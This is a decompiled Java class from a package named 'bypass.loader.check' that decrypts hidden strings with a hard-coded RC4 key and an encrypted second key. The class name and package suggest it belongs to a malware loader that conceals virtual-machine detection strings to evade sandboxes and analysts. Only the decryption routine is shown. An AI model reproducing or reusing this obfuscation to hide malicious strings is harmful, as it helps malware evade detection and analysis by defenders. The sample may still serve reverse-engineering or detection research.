package bypass.loader.check;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import sun.misc.BASE64Decoder;

public class VirtualMachineFilesStrings {
   public static String M = "ARCFOUR";
   public static String B = "sJeGAIiwGPUaKdpb";
   private static final long a = 6538836198704L;

   public static String F(String var0) {
      String var4 = "Juxv4gP4PqgDH7lqCMYEDQ==";

      String var3;
      try {
         Cipher var5 = Cipher.getInstance(M);
         SecretKeySpec var6 = new SecretKeySpec(B.getBytes(), M);
         var5.init(2, var6);
         byte[] var7 = new BASE64Decoder().decodeBuffer(var4);
         byte[] var8 = var5.doFinal(var7);
         SecretKeySpec var9 = new SecretKeySpec(var8, M);
         var5.init(2, var9);
         byte[] var10 = new BASE64Decoder().decodeBuffer(var0);
         byte[] var11 = var5.doFinal(var10);
         var3 = new String(var11);
      } catch (Exception var12) {
         var3 = "";
      }

      return var3;
   }
}
